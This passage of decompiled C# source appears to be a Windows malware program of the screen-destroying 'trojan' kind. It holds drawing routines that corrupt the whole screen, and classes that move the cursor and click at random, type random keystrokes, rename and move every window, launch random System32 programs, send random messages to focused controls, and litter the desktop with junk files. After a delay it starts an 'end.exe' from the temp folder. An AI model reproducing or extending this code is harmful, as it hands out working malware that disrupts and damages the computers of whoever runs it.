				StretchBlt(intPtr, 0, 0, screenW / 2, screenH / 2, intPtr, 0, 0, screenW, screenH, TernaryRasterOperations.SRCCOPY);
				StretchBlt(intPtr, screenW / 2, 0, screenW / 2, screenH / 2, intPtr, 0, 0, screenW, screenH, TernaryRasterOperations.SRCCOPY);
				StretchBlt(intPtr, 0, screenH / 2, screenW / 2, screenH / 2, intPtr, 0, 0, screenW, screenH, TernaryRasterOperations.SRCCOPY);
				StretchBlt(intPtr, screenW / 2, screenH / 2, screenW / 2, screenH / 2, intPtr, 0, 0, screenW, screenH, TernaryRasterOperations.SRCCOPY);
				Graphics val = Graphics.FromHdc(intPtr);
				ballPosX += moveStepX;
				if (ballPosX < 0 || ballPosX + ballWidth > screenW)
				{
					moveStepX = -moveStepX;
				}
				ballPosY += moveStepY;
				if (ballPosY < 0 || ballPosY + ballHeight > screenH)
				{
					moveStepY = -moveStepY;
				}
				ballPosX1 += moveStepX1;
				if (ballPosX1 < 0 || ballPosX1 + ballWidth1 > screenW)
				{
					moveStepX1 = -moveStepX1;
				}
				ballPosY1 += moveStepY1;
				if (ballPosY1 < 0 || ballPosY1 + ballHeight1 > screenH)
				{
					moveStepY1 = -moveStepY1;
				}
				ballPosX2 += moveStepX2;
				if (ballPosX2 < 0 || ballPosX2 + ballWidth2 > screenW)
				{
					moveStepX2 = -moveStepX2;
				}
				ballPosY2 += moveStepY2;
				if (ballPosY2 < 0 || ballPosY2 + ballHeight2 > screenH)
				{
					moveStepY2 = -moveStepY2;
				}
				cc += 10;
				HSL hsl = new HSL(cc % 240, 1f, 0.5f);
				RGB rGB = HSLToRGB(hsl);
				Brush val2 = (Brush)new SolidBrush(Color.FromArgb(rGB.R, rGB.G, rGB.B));
				Pen val3 = new Pen(Color.Red);
				PointF pointF = new PointF(ballPosX, ballPosY);
				PointF pointF2 = new PointF(ballPosX1, ballPosY1);
				PointF pointF3 = new PointF(ballPosX2, ballPosY2);
				PointF[] array = new PointF[3] { pointF, pointF2, pointF3 };
				val.FillPolygon(val2, array);
				BitBlt(hdc, 0, 0, screenW, screenH, intPtr, 0, 0, 13369376);
				DeleteObject(intPtr);
				DeleteObject(intPtr2);
				Thread.Sleep(random.Next(10));
			}
			catch
			{
			}
		}
	}

	private class Drawer16 : Drawer
	{
		private int redrawCounter;

		private int redrawCounter2;

		private static Random r = new Random();

		private int cc;

		private static int ballWidth = 0;

		private static int ballHeight = 0;

		private static int ballPosX = r.Next(Screen.PrimaryScreen.Bounds.Width - 600);

		private static int ballPosY = r.Next(Screen.PrimaryScreen.Bounds.Height - 600);

		private static int moveStepX = r.Next(1, 17);

		private static int moveStepY = r.Next(1, 17);

		private static int ballWidth1 = 0;

		private static int ballHeight1 = 0;

		private static int ballPosX1 = r.Next(Screen.PrimaryScreen.Bounds.Width - 600);

		private static int ballPosY1 = r.Next(Screen.PrimaryScreen.Bounds.Height - 600);

		private static int moveStepX1 = r.Next(1, 17);

		private static int moveStepY1 = r.Next(1, 17);

		private static int ballWidth2 = 0;

		private static int ballHeight2 = 0;

		private static int ballPosX2 = r.Next(Screen.PrimaryScreen.Bounds.Width - 600);

		private static int ballPosY2 = r.Next(Screen.PrimaryScreen.Bounds.Height - 600);

		private static int moveStepX2 = r.Next(1, 17);

		private static int moveStepY2 = r.Next(1, 17);

		public override void Draw(IntPtr hdc)
		{
			//IL_025d: Unknown result type (might be due to invalid IL or missing references)
			//IL_0264: Expected O, but got Unknown
			//IL_0269: Unknown result type (might be due to invalid IL or missing references)
			//IL_0270: Expected O, but got Unknown
			try
			{
				IntPtr intPtr = CreateCompatibleDC(hdc);
				IntPtr intPtr2 = CreateCompatibleBitmap(hdc, screenW, screenH);
				SelectObject(intPtr, intPtr2);
				BitBlt(intPtr, 0, 0, screenW, screenH, hdc, 0, 0, 13369376);
				for (int i = 0; i < screenW; i++)
				{
					BitBlt(intPtr, 0, i, screenW, 1, intPtr, random.Next(-5, 6), i, 13369376);
				}
				Graphics val = Graphics.FromHdc(intPtr);
				ballPosX += moveStepX;
				if (ballPosX < 0 || ballPosX + ballWidth > screenW)
				{
					moveStepX = -moveStepX;
				}
				ballPosY += moveStepY;
				if (ballPosY < 0 || ballPosY + ballHeight > screenH)
				{
					moveStepY = -moveStepY;
				}
				ballPosX1 += moveStepX1;
				if (ballPosX1 < 0 || ballPosX1 + ballWidth1 > screenW)
				{
					moveStepX1 = -moveStepX1;
				}
				ballPosY1 += moveStepY1;
				if (ballPosY1 < 0 || ballPosY1 + ballHeight1 > screenH)
				{
					moveStepY1 = -moveStepY1;
				}
				ballPosX2 += moveStepX2;
				if (ballPosX2 < 0 || ballPosX2 + ballWidth2 > screenW)
				{
					moveStepX2 = -moveStepX2;
				}
				ballPosY2 += moveStepY2;
				if (ballPosY2 < 0 || ballPosY2 + ballHeight2 > screenH)
				{
					moveStepY2 = -moveStepY2;
				}
				cc += 10;
				HSL hsl = new HSL(cc % 120, 1f, 0.5f);
				RGB rGB = HSLToRGB(hsl);
				Brush val2 = (Brush)new SolidBrush(Color.FromArgb(rGB.R, rGB.G, rGB.B));
				Pen val3 = new Pen(Color.Red);
				PointF pointF = new PointF(ballPosX, ballPosY);
				PointF pointF2 = new PointF(ballPosX1, ballPosY1);
				PointF pointF3 = new PointF(ballPosX2, ballPosY2);
				PointF[] array = new PointF[3] { pointF, pointF2, pointF3 };
				val.FillPolygon(val2, array);
				BitBlt(hdc, 0, 0, screenW, screenH, intPtr, 0, 0, 13369376);
				DeleteObject(intPtr);
				DeleteObject(intPtr2);
				Thread.Sleep(random.Next(10));
			}
			catch
			{
			}
		}
	}

	private class Drawer17 : Drawer
	{
		private int cc;

		private Icon app = Extract("user32.dll", 5, largeIcon: true);

		private Icon warn_ico = Extract("user32.dll", 1, largeIcon: true);

		private Icon no_ico = Extract("user32.dll", 3, largeIcon: true);

		public override void Draw(IntPtr hdc)
		{
			//IL_017f: Unknown result type (might be due to invalid IL or missing references)
			//IL_0186: Expected O, but got Unknown
			//IL_020d: Unknown result type (might be due to invalid IL or missing references)
			//IL_0214: Expected O, but got Unknown
			try
			{
				IntPtr intPtr = CreateCompatibleDC(hdc);
				IntPtr intPtr2 = CreateCompatibleBitmap(hdc, screenW, screenH);
				SelectObject(intPtr, intPtr2);
				BitBlt(intPtr, 0, 0, screenW, screenH, hdc, 0, 0, 13369376);
				for (int i = 0; i < 100; i++)
				{
					int num = random.Next(-screenW, screenW + screenW);
					int num2 = random.Next(-screenH, screenH + screenH);
					int nWidth = random.Next(-screenW, screenW + screenW);
					int nHeight = random.Next(-screenH, screenH + screenH);
					BitBlt(intPtr, num, num2, nWidth, nHeight, intPtr, num + random.Next(-10, 11), num2 + random.Next(-10, 11), 13369376);
				}
				Graphics val = Graphics.FromHdc(intPtr);
				for (int j = 0; j < screenH; j += 2)
				{
					cc++;
					HSL hsl = new HSL(cc % 120, 1f, 0.5f);
					RGB rGB = HSLToRGB(hsl);
					Pen val2 = new Pen(Color.FromArgb(128, rGB.R, rGB.G, rGB.B), 1f);
					val.DrawLine(val2, 0, j, screenW, j);
				}
				System.Type typeFromHandle = typeof(Cursors);
				PropertyInfo[] properties = typeFromHandle.GetProperties(BindingFlags.Static | BindingFlags.Public);
				PropertyInfo[] array = properties;
				foreach (PropertyInfo propertyInfo in array)
				{
					Point location = new Point(random.Next(screenW), random.Next(screenH));
					Cursor val3 = (Cursor)propertyInfo.GetValue(null, null);
					val3.Draw(val, new Rectangle(location, val3.Size));
				}
				Bitmap val4 = app.ToBitmap();
				Bitmap val5 = warn_ico.ToBitmap();
				Bitmap val6 = no_ico.ToBitmap();
				val.DrawImage((Image)(object)val4, random.Next(screenW), random.Next(screenH), random.Next(200), random.Next(200));
				val.DrawImage((Image)(object)val5, random.Next(screenW), random.Next(screenH), random.Next(200), random.Next(200));
				val.DrawImage((Image)(object)val6, random.Next(screenW), random.Next(screenH), random.Next(200), random.Next(200));
				_BLENDFUNCTION ftn = default(_BLENDFUNCTION);
				ftn.BlendOp = 0;
				ftn.BlendFlags = 0;
				ftn.SourceConstantAlpha = (byte)random.Next(255);
				ftn.AlphaFormat = 0;
				AlphaBlend(hdc, 0, 0, screenW, screenH, intPtr, 0, 0, screenW, screenH, ftn);
				DeleteObject(intPtr);
				DeleteObject(intPtr2);
				val.Dispose();
			}
			catch
			{
			}
		}
	}

	private class Drawer18 : Drawer
	{
		private int redrawCounter;

		public override void Draw(IntPtr hdc)
		{
			try
			{
				IntPtr intPtr = CreateCompatibleDC(hdc);
				IntPtr intPtr2 = CreateCompatibleBitmap(hdc, screenW, screenH);
				SelectObject(intPtr, intPtr2);
				BitBlt(intPtr, 0, 0, screenW, screenH, hdc, 0, 0, 13369376);
				for (int i = 0; i < 500; i++)
				{
					int num = random.Next(-screenW, screenW + screenW);
					int num2 = random.Next(-screenH, screenH + screenH);
					int nWidth = random.Next(-screenW, screenW + screenW);
					int nHeight = random.Next(-screenH, screenH + screenH);
					BitBlt(intPtr, num, num2, nWidth, nHeight, intPtr, num + random.Next(-1, 2), num2 + random.Next(-1, 2), 13369376);
				}
				_BLENDFUNCTION ftn = default(_BLENDFUNCTION);
				ftn.BlendOp = 0;
				ftn.BlendFlags = 0;
				ftn.SourceConstantAlpha = 127;
				ftn.AlphaFormat = 0;
				AlphaBlend(hdc, 0, 0, screenW, screenH, intPtr, 0, 0, screenW, screenH, ftn);
				DeleteObject(intPtr);
				DeleteObject(intPtr2);
				Thread.Sleep(random.Next(10));
			}
			catch
			{
			}
		}
	}

	private class Drawer19 : Drawer
	{
		private int redrawCounter;

		private int redrawCounter2;

		private static Random r = new Random();

		private int cc;

		private static int ballWidth = 0;

		private static int ballHeight = 0;

		private static int ballPosX = r.Next(Screen.PrimaryScreen.Bounds.Width - 600);

		private static int ballPosY = r.Next(Screen.PrimaryScreen.Bounds.Height - 600);

		private static int moveStepX = r.Next(1, 17);

		private static int moveStepY = r.Next(1, 17);

		private static int ballWidth1 = 0;

		private static int ballHeight1 = 0;

		private static int ballPosX1 = r.Next(Screen.PrimaryScreen.Bounds.Width - 600);

		private static int ballPosY1 = r.Next(Screen.PrimaryScreen.Bounds.Height - 600);

		private static int moveStepX1 = r.Next(1, 17);

		private static int moveStepY1 = r.Next(1, 17);

		private static int ballWidth2 = 0;

		private static int ballHeight2 = 0;

		private static int ballPosX2 = r.Next(Screen.PrimaryScreen.Bounds.Width - 600);

		private static int ballPosY2 = r.Next(Screen.PrimaryScreen.Bounds.Height - 600);

		private static int moveStepX2 = r.Next(1, 17);

		private static int moveStepY2 = r.Next(1, 17);

		private static int ballWidth3 = 0;

		private static int ballHeight3 = 0;

		private static int ballPosX3 = r.Next(Screen.PrimaryScreen.Bounds.Width - 600);

		private static int ballPosY3 = r.Next(Screen.PrimaryScreen.Bounds.Height - 600);

		private static int moveStepX3 = r.Next(1, 17);

		private static int moveStepY3 = r.Next(1, 17);

		public override void Draw(IntPtr hdc)
		{
			//IL_02e7: Unknown result type (might be due to invalid IL or missing references)
			//IL_02ee: Expected O, but got Unknown
			//IL_02f4: Unknown result type (might be due to invalid IL or missing references)
			//IL_02fc: Unknown result type (might be due to invalid IL or missing references)
			try
			{
				IntPtr intPtr = CreateCompatibleDC(hdc);
				IntPtr intPtr2 = CreateCompatibleBitmap(hdc, screenW, screenH);
				SelectObject(intPtr, intPtr2);
				BitBlt(intPtr, 0, 0, screenW, screenH, hdc, 0, 0, 13369376);
				for (int i = 0; i < screenW; i++)
				{
					BitBlt(intPtr, 0, i, screenW, 1, intPtr, random.Next(-5, 6), i, 13369376);
				}
				Graphics val = Graphics.FromHdc(intPtr);
				ballPosX += moveStepX;
				if (ballPosX < 0 || ballPosX + ballWidth > screenW)
				{
					moveStepX = -moveStepX;
				}
				ballPosY += moveStepY;
				if (ballPosY < 0 || ballPosY + ballHeight > screenH)
				{
					moveStepY = -moveStepY;
				}
				ballPosX1 += moveStepX1;
				if (ballPosX1 < 0 || ballPosX1 + ballWidth1 > screenW)
				{
					moveStepX1 = -moveStepX1;
				}
				ballPosY1 += moveStepY1;
				if (ballPosY1 < 0 || ballPosY1 + ballHeight1 > screenH)
				{
					moveStepY1 = -moveStepY1;
				}
				ballPosX2 += moveStepX2;
				if (ballPosX2 < 0 || ballPosX2 + ballWidth2 > screenW)
				{
					moveStepX2 = -moveStepX2;
				}
				ballPosY2 += moveStepY2;
				if (ballPosY2 < 0 || ballPosY2 + ballHeight2 > screenH)
				{
					moveStepY2 = -moveStepY2;
				}
				ballPosX3 += moveStepX3;
				if (ballPosX3 < 0 || ballPosX3 + ballWidth3 > screenW)
				{
					moveStepX3 = -moveStepX3;
				}
				ballPosY3 += moveStepY3;
				if (ballPosY3 < 0 || ballPosY3 + ballHeight3 > screenH)
				{
					moveStepY3 = -moveStepY3;
				}
				cc += 10;
				HSL hsl = new HSL(cc % 240, 1f, 0.5f);
				RGB rGB = HSLToRGB(hsl);
				Pen val2 = new Pen(Color.FromArgb(rGB.R, rGB.G, rGB.B), 32f);
				LineCap startCap = (LineCap)2;
				val2.EndCap = (LineCap)2;
				val2.StartCap = startCap;
				Point point = new Point(ballPosX, ballPosY);
				Point point2 = new Point(ballPosX1, ballPosY1);
				Point point3 = new Point(ballPosX2, ballPosY2);
				Point point4 = new Point(ballPosX3, ballPosY3);
				val.DrawBezier(val2, point, point2, point3, point4);
				BitBlt(hdc, 0, 0, screenW, screenH, intPtr, 0, 0, 13369376);
				DeleteObject(intPtr);
				DeleteObject(intPtr2);
				Thread.Sleep(random.Next(10));
			}
			catch
			{
			}
		}
	}

	private class Drawer20 : Drawer
	{
		private int redrawCounter2;

		private int redrawCounter;

		private static Random r = new Random();

		private int cc;

		private static int ballWidth = 200;

		private static int ballHeight = 200;

		private static int ballPosX = r.Next(Screen.PrimaryScreen.Bounds.Width - 200);

		private static int ballPosY = r.Next(Screen.PrimaryScreen.Bounds.Height - 200);

		private static int moveStepX = 10;

		private static int moveStepY = 10;

		public override void Draw(IntPtr hdc)
		{
			//IL_0230: Unknown result type (might be due to invalid IL or missing references)
			//IL_0237: Expected O, but got Unknown
			//IL_023c: Unknown result type (might be due to invalid IL or missing references)
			//IL_0243: Expected O, but got Unknown
			try
			{
				IntPtr intPtr = CreateCompatibleDC(hdc);
				IntPtr intPtr2 = CreateCompatibleBitmap(hdc, screenW, screenH);
				SelectObject(intPtr, intPtr2);
				BitBlt(intPtr, 0, 0, screenW, screenH, hdc, 0, 0, 13369376);
				Graphics val = Graphics.FromHdc(intPtr);
				float num = 0f;
				float num2 = 0f;
				float num3 = 0f;
				float num4 = 0f;
				float num5 = 100f;
				for (float num6 = 0f; num6 < (float)(Screen.PrimaryScreen.Bounds.Height / 10); num6 += 0.1f)
				{
					num3 = (float)Math.Sin(num6);
					redrawCounter2++;
					int num7 = redrawCounter2;
					int num8 = (int)Math.Round(num2 * num5 + num4);
					BitBlt(intPtr, num8, num7, screenW, 1, intPtr, 0, num7, 13369376);
					BitBlt(intPtr, screenW + num8, num7, screenW, 1, intPtr, 0, num7, 13369376);
					BitBlt(intPtr, -screenW + num8, num7, screenW, 1, intPtr, 0, num7, 13369376);
					if (redrawCounter2 >= screenH)
					{
						redrawCounter2 = 0;
					}
					num = num6;
					num2 = num3;
				}
				ballPosX += moveStepX;
				if (ballPosX < 0 || ballPosX + ballWidth > screenW)
				{
					moveStepX = -moveStepX;
				}
				ballPosY += moveStepY;
				if (ballPosY < 0 || ballPosY + ballHeight > screenH)
				{
					moveStepY = -moveStepY;
				}
				cc += 10;
				HSL hsl = new HSL(cc % 240, 1f, 0.5f);
				RGB rGB = HSLToRGB(hsl);
				Brush val2 = (Brush)new SolidBrush(Color.FromArgb(rGB.R, rGB.G, rGB.B));
				Pen val3 = new Pen(Color.Red);
				val.FillEllipse(val2, ballPosX, ballPosY, ballWidth, ballHeight);
				for (int i = 0; i < 100; i += 10)
				{
					val.DrawEllipse(val3, ballPosX - i / 2, ballPosY - i / 2, ballWidth + i, ballHeight + i);
				}
				BitBlt(hdc, 0, 0, screenW, screenH, intPtr, 0, 0, 13369376);
				DeleteObject(intPtr);
				DeleteObject(intPtr2);
				Thread.Sleep(random.Next(10));
			}
			catch
			{
			}
		}
	}

	private class Cur : Drawer
	{
		public override void Draw(IntPtr hdc)
		{
			try
			{
				Cursor.Position = new Point(random.Next(screenW), random.Next(screenH));
				DoMouseClick();
				Thread.Sleep(random.Next(0, 1000));
			}
			catch
			{
			}
			Thread.Sleep(0);
		}
	}

	private class Windowtext : Drawer
	{
		public override void Draw(IntPtr hdc)
		{
			try
			{
				Process process = new Process();
				Process[] processes = Process.GetProcesses();
				Process[] array = processes;
				foreach (Process process2 in array)
				{
					IntPtr mainWindowHandle = process2.MainWindowHandle;
					if (mainWindowHandle != IntPtr.Zero)
					{
						Random random = new Random();
						int num = random.Next(4, 10);
						string text = "";
						for (int j = 0; j < num; j++)
						{
							int num2 = random.Next(0, 6969);
							text += Convert.ToChar(num2 + random.Next(0, 6969));
						}
						SetWindowText(GetForegroundWindow(), text);
						SetWindowText(process2.Handle, text);
						SetWindowText(mainWindowHandle, text);
						Thread.Sleep(0);
					}
				}
			}
			catch
			{
			}
		}
	}

	private class Type : Drawer
	{
		public override void Draw(IntPtr hdc)
		{
			try
			{
				Random random = new Random();
				int num = random.Next(4, 10);
				string text = "";
				for (int i = 0; i < num; i++)
				{
					int num2 = random.Next(0, 6969);
					text += Convert.ToChar(num2 + random.Next(0, 6969));
				}
				SendKeys.SendWait(text);
				Thread.Sleep(base.random.Next(1000));
			}
			catch
			{
			}
		}
	}

	private class Window : Drawer
	{
		public override void Draw(IntPtr hdc)
		{
			Process process = new Process();
			Process[] processes = Process.GetProcesses();
			Process[] array = processes;
			foreach (Process process2 in array)
			{
				try
				{
					Console.WriteLine("Process Name: {0} ", process2.ProcessName);
					IntPtr mainWindowHandle = process2.MainWindowHandle;
					if (mainWindowHandle != IntPtr.Zero)
					{
						Random random = new Random();
						MoveWindow(GetForegroundWindow(), base.random.Next(screenW), base.random.Next(screenH), base.random.Next(screenW), base.random.Next(screenH), bRepaint: true);
						MoveWindow(mainWindowHandle, base.random.Next(screenW), base.random.Next(screenH), base.random.Next(screenW), base.random.Next(screenH), bRepaint: true);
						MoveWindow(process2.Handle, base.random.Next(screenW), base.random.Next(screenH), base.random.Next(screenW), base.random.Next(screenH), bRepaint: true);
						MoveWindow(hdc, base.random.Next(screenW), base.random.Next(screenH), base.random.Next(screenW), base.random.Next(screenH), bRepaint: true);
						Thread.Sleep(base.random.Next(0, 30000));
					}
				}
				catch
				{
				}
			}
		}
	}

	private class Open : Drawer
	{
		public override void Draw(IntPtr hdc)
		{
			try
			{
				Random random = new Random();
				string[] files = Directory.GetFiles("c:\\Windows\\System32");
				Process.Start(files[random.Next(files.Length)]);
				Thread.Sleep(base.random.Next(15000, 30000));
			}
			catch
			{
			}
		}
	}

	private class SendM : Drawer
	{
		public override void Draw(IntPtr hdc)
		{
			try
			{
				Process process = new Process();
				Process[] processes = Process.GetProcesses();
				Process[] array = processes;
				foreach (Process process2 in array)
				{
					IntPtr mainWindowHandle = process2.MainWindowHandle;
					if (mainWindowHandle != IntPtr.Zero)
					{
						int num = random.Next(100);
						string text = "";
						for (int j = 0; j < num; j++)
						{
							int num2 = random.Next(0, 255);
							text += Convert.ToChar(num2 + random.Next(0, 255));
						}
						string text2 = text;
						SetWindowText(mainWindowHandle, text2);
						SetWindowText(process2.Handle, text);
						StringBuilder stringBuilder = new StringBuilder(32767);
						uint windowThreadProcessId = GetWindowThreadProcessId((int)GetForegroundWindow(), 0);
						uint currentThreadId = GetCurrentThreadId();
						AttachThreadInput(windowThreadProcessId, currentThreadId, fAttach: true);
						int focus = GetFocus();
						AttachThreadInput(windowThreadProcessId, currentThreadId, fAttach: false);
						string text3 = text;
						char[] array2 = new char[1];
						for (int k = 0; k < array2.Length; k++)
						{
							array2[k] = text3[random.Next(text3.Length)];
						}
						string oldValue = new string(array2);
						SendMessage(focus, random.Next(0, 255), stringBuilder.Capacity, stringBuilder);
						stringBuilder.Replace(oldValue, text);
						stringBuilder.Append(text);
						SendMessage(focus, random.Next(0, 255), 0, stringBuilder);
						Thread.Sleep(random.Next(5000));
					}
				}
			}
			catch
			{
			}
		}
	}

	private class createfiles : Drawer
	{
		public override void Draw(IntPtr hdc)
		{
			try
			{
				int num = random.Next(100);
				string text = "";
				for (int i = 0; i < num; i++)
				{
					int num2 = random.Next(0, 255);
					text += Convert.ToChar(num2 + random.Next(0, 255));
				}
				int num3 = random.Next(100);
				string text2 = "";
				for (int j = 0; j < num3; j++)
				{
					int num4 = random.Next(0, 255);
					text2 += Convert.ToChar(num4 + random.Next(0, 255));
				}
				string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), text + "." + text2);
				try
				{
					if (File.Exists(path))
					{
						File.Delete(path);
					}
					using (FileStream fileStream = File.Create(path))
					{
						byte[] bytes = new UTF8Encoding(encoderShouldEmitUTF8Identifier: true).GetBytes(text);
						fileStream.Write(bytes, 0, bytes.Length);
						byte[] bytes2 = new UTF8Encoding(encoderShouldEmitUTF8Identifier: true).GetBytes(text2);
						fileStream.Write(bytes2, 0, bytes2.Length);
					}
					using StreamReader streamReader = File.OpenText(path);
					string text3 = "";
					while ((text3 = streamReader.ReadLine()) != null)
					{
						Console.WriteLine(text3);
					}
				}
				catch (Exception ex)
				{
					Console.WriteLine(ex.ToString());
				}
				Thread.Sleep(random.Next(30000, 60000));
			}
			catch
			{
			}
		}
	}

	private class msg : Drawer
	{
		public override void Draw(IntPtr hdc)
		{
			try
			{
				Application.Run((Form)(object)new Form1());
			}
			catch
			{
			}
		}
	}

	private class ends : Drawer
	{
		public override void Draw(IntPtr hdc)
		{
			Thread.Sleep(random.Next(600000));
			string fileName = Path.Combine(Path.GetTempPath(), "end.exe");
			Process.Start(fileName);
		}
	}

	private class bb : Drawer
	{
		public override void Draw(IntPtr hdc)
		{
			Random random = new Random(Guid.NewGuid().GetHashCode());
			switch (GetSomeRandomNumber(1, 21))
			{
			case 1:
				byte1(base.random.Next(44100), 15);
				break;
			case 2:
				byte2(base.random.Next(44100), 15);
				break;
			case 3:
				byte3(base.random.Next(44100), 15);
				break;
			case 4:
				byte4(base.random.Next(44100), 15);
				break;
			case 5:
				byte5(base.random.Next(44100), 15);
				break;
			case 6:
				byte6(base.random.Next(44100), 15);
				break;
			case 7:
				byte7(base.random.Next(44100), 15);
				break;
			case 8:
				byte8(base.random.Next(44100), 15);
				break;
			case 9:
				byte9(base.random.Next(44100), 15);
				break;
			case 10:
				byte10(base.random.Next(44100), 15);
				break;
			case 11:
				byte11(base.random.Next(44100), 15);
				break;
			case 12:
				byte12(base.random.Next(44100), 15);
				break;
			case 13:
				byte13(base.random.Next(44100), 15);
				break;
			case 14:
				byte14(base.random.Next(44100), 15);
				break;
			case 15:
				byte15(base.random.Next(44100), 15);
				break;
			case 16:
				byte16(base.random.Next(44100), 15);
				break;
			case 17:
				byte17(base.random.Next(44100), 15);
				break;
			case 18:
				byte18(base.random.Next(44100), 15);
				break;
			case 19:
				byte19(base.random.Next(44100), 15);
				break;
			case 20:
				byte20(base.random.Next(44100), 15);
				break;
			}
		}
	}

	private abstract class Drawer
	{
		public bool running;

		public Random random = new Random();

		public int screenW = Screen.PrimaryScreen.Bounds.Width;

		public int screenH = Screen.PrimaryScreen.Bounds.Height;

		public void Start()
		{
			if (!running)
			{
				running = true;
				new Thread(DrawLoop).Start();
			}
		}

		public void Stop()
		{
			running = false;
		}

		private void DrawLoop()
		{
			while (running)
			{
				IntPtr dC = GetDC(IntPtr.Zero);
				Draw(dC);
				ReleaseDC(IntPtr.Zero, dC);
			}
		}

		public void Redraw()
		{
			RedrawWindow(IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, RedrawWindowFlags.Invalidate | RedrawWindowFlags.Erase | RedrawWindowFlags.AllChildren);
		}

		public abstract void Draw(IntPtr hdc);
	}

	[Flags]
	private enum RedrawWindowFlags : uint
	{
		Invalidate = 1u,
		InternalPaint = 2u,
		Erase = 4u,
		Validate = 8u,
		NoInternalPaint = 0x10u,
		NoErase = 0x20u,
		NoChildren = 0x40u,
		AllChildren = 0x80u,
		UpdateNow = 0x100u,
		EraseNow = 0x200u,
		Frame = 0x400u,
		NoFrame = 0x800u
	}

	private class randomdrawer : Drawer
	{
		public override void Draw(IntPtr hdc)
		{
			Random random = new Random(Guid.NewGuid().GetHashCode());
			int someRandomNumber = GetSomeRandomNumber(1, 21);
			Drawer drawer = new Drawer1();
			Drawer drawer2 = new Drawer2();
			Drawer drawer3 = new Drawer3();
			Drawer drawer4 = new Drawer4();
			Drawer drawer5 = new Drawer5();
			Drawer drawer6 = new Drawer6();
			Drawer drawer7 = new Drawer7();
			Drawer drawer8 = new Drawer8();
			Drawer drawer9 = new Drawer9();
			Drawer drawer10 = new Drawer10();
			Drawer drawer11 = new Drawer11();
			Drawer drawer12 = new Drawer12();
			Drawer drawer13 = new Drawer13();
			Drawer drawer14 = new Drawer14();
			Drawer drawer15 = new Drawer15();
			Drawer drawer16 = new Drawer16();
			Drawer drawer17 = new Drawer17();
			Drawer drawer18 = new Drawer18();
			Drawer drawer19 = new Drawer19();
			Drawer drawer20 = new Drawer20();
			switch (someRandomNumber)
			{
			case 1:
				drawer.Start();
				Thread.Sleep(base.random.Next(15000));
				drawer.Stop();
				break;
			case 2:
				drawer2.Start();
				Thread.Sleep(base.random.Next(15000));
				drawer2.Stop();
				break;
			case 3:
				drawer3.Start();
				Thread.Sleep(base.random.Next(15000));
				drawer3.Stop();
				break;
			case 4:
				drawer4.Start();
				Thread.Sleep(base.random.Next(15000));
				drawer4.Stop();
				break;
			case 5:
				drawer5.Start();
				Thread.Sleep(base.random.Next(15000));
				drawer5.Stop();
				break;
			case 6:
				drawer6.Start();
				Thread.Sleep(base.random.Next(15000));
				drawer6.Stop();
				break;
			case 7:
				drawer7.Start();
				Thread.Sleep(base.random.Next(15000));
				drawer7.Stop();
				break;
			case 8:
				drawer8.Start();
				Thread.Sleep(base.random.Next(15000));
				drawer8.Stop();
				break;
			case 9:
				drawer9.Start();
				Thread.Sleep(base.random.Next(15000));
				drawer9.Stop();
				break;
			case 10:
				drawer10.Start();
				Thread.Sleep(base.random.Next(15000));
				drawer10.Stop();
				break;
			case 11:
				drawer11.Start();
				Thread.Sleep(base.random.Next(15000));
				drawer11.Stop();
				break;
			case 12:
				drawer12.Start();
				Thread.Sleep(base.random.Next(15000));
				drawer12.Stop();
				break;
			case 13:
				drawer13.Start();
				Thread.Sleep(base.random.Next(15000));
				drawer13.Stop();
				break;
			case 14:
				drawer14.Start();
				Thread.Sleep(base.random.Next(15000));
				drawer14.Stop();
				break;
			case 15:
				drawer15.Start();
				Thread.Sleep(base.random.Next(15000));
				drawer15.Stop();
				break;
			case 16:
				drawer16.Start();
				Thread.Sleep(base.random.Next(15000));
				drawer16.Stop();
				break;
			case 17:
				drawer17.Start();
				Thread.Sleep(base.random.Next(15000));
				drawer17.Stop();
				break;
			case 18:
				drawer18.Start();
				Thread.Sleep(base.random.Next(15000));
				drawer18.Stop();
				break;
			case 19:
				drawer19.Start();
				Thread.Sleep(base.random.Next(15000));
				drawer19.Stop();
				break;
			case 20:
				drawer20.Start();
				Thread.Sleep(base.random.Next(15000));
				drawer20.Stop();
				break;
			}
		}
	}

	private class randomdrawer1 : Drawer
	{
		public override void Draw(IntPtr hdc)
		{
			Random random = new Random(Guid.NewGuid().GetHashCode());
			int someRandomNumber = GetSomeRandomNumber(1, 21);
			Drawer drawer = new Drawer1();
			Drawer drawer2 = new Drawer2();
			Drawer drawer3 = new Drawer3();
			Drawer drawer4 = new Drawer4();
			Drawer drawer5 = new Drawer5();
			Drawer drawer6 = new Drawer6();
			Drawer drawer7 = new Drawer7();
			Drawer drawer8 = new Drawer8();
			Drawer drawer9 = new Drawer9();
			Drawer drawer10 = new Drawer10();
			Drawer drawer11 = new Drawer11();
			Drawer drawer12 = new Drawer12();
			Drawer drawer13 = new Drawer13();
			Drawer drawer14 = new Drawer14();
			Drawer drawer15 = new Drawer15();
			Drawer drawer16 = new Drawer16();
			Drawer drawer17 = new Drawer17();
			Drawer drawer18 = new Drawer18();
			Drawer drawer19 = new Drawer19();
			Drawer drawer20 = new Drawer20();
			switch (someRandomNumber)
			{
			case 20:
				drawer.Start();
				Thread.Sleep(base.random.Next(15000));
				drawer.Stop();
				break;
			case 19:
				drawer2.Start();
				Thread.Sleep(base.random.Next(15000));
				drawer2.Stop();
				break;
			case 18:
				drawer3.Start();
				Thread.Sleep(base.random.Next(15000));
				drawer3.Stop();
				break;
			case 17:
				drawer4.Start();
				Thread.Sleep(base.random.Next(15000));
				drawer4.Stop();
				break;
			case 16:
				drawer5.Start();
				Thread.Sleep(base.random.Next(15000));
				drawer5.Stop();
				break;
			case 15:
				drawer6.Start();
				Thread.Sleep(base.random.Next(15000));
				drawer6.Stop();
				break;
			case 14:
				drawer7.Start();
				Thread.Sleep(base.random.Next(15000));
				drawer7.Stop();
				break;
			case 13:
				drawer8.Start();
				Thread.Sleep(base.random.Next(15000));
				drawer8.Stop();
				break;
			case 12:
				drawer9.Start();
				Thread.Sleep(base.random.Next(15000));
				drawer9.Stop();
				break;
			case 11:
				drawer10.Start();
				Thread.Sleep(base.random.Next(15000));
				drawer10.Stop();
				break;
			case 10:
				drawer11.Start();
				Thread.Sleep(base.random.Next(15000));
				drawer11.Stop();
				break;
			case 9:
				drawer12.Start();
				Thread.Sleep(base.random.Next(15000));
				drawer12.Stop();
				break;
			case 8:
				drawer13.Start();
				Thread.Sleep(base.random.Next(15000));
				drawer13.Stop();
				break;
			case 7:
				drawer14.Start();
